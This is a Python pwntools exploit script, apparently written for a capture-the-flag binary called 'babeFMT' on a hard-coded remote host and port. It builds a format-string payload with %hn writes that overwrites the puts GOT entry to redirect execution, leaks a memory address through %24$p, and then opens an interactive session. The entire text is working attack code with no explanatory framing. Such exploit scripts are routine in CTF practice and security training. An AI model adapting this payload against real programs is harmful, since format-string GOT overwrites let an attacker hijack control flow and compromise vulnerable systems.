from pwn import *

remote_ip, port = '34.126.117.181', 2222
binary = './babeFMT'

if len(sys.argv)>1:
    io = remote(remote_ip, port)

else:
    io = process(binary)
    """
    gdb.attach(io,'''
    b *0x0804924b
    ''')
    """

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def get_length(a,b):
    while(hex(a)[-4:]!=b):
        a = a+1
    print(hex(a))
    print(b)
    return a

def fstring_payload(addr,waddr):
    addr=hex(addr).replace("0x","")
    if len(addr)<8:
        addr=addr.rjust(8,"0")
    var1=int(addr[-4:],16)-13
    s2=addr[-8:-4]
    var2=get_length(var1,s2)-var1-13
    payload = "%{}c%{}$hn%{}c%{}$hn".format(var1,16,var2,17).ljust(40,"a")
    payload += p32(waddr) 
    payload += p32(waddr+2)
    return payload

puts_got = 0x0804c01c
readstr = 0x8049213

if __name__ == "__main__":
    sla("name? :","A A A")
    rl()
    sleep(0.2)
    payload1 = "a"*16
    payload1 += "%24$p".ljust(8,"a")
    payload1 += fstring_payload(readstr, puts_got)
    sl(payload1)
    #print(payload1)
    #print(len(payload1))
    re(16)
    leak = int(re(10),16)-5
    sleep(0.2)
    log.info("Strlen: "+hex(leak))
    io.interactive()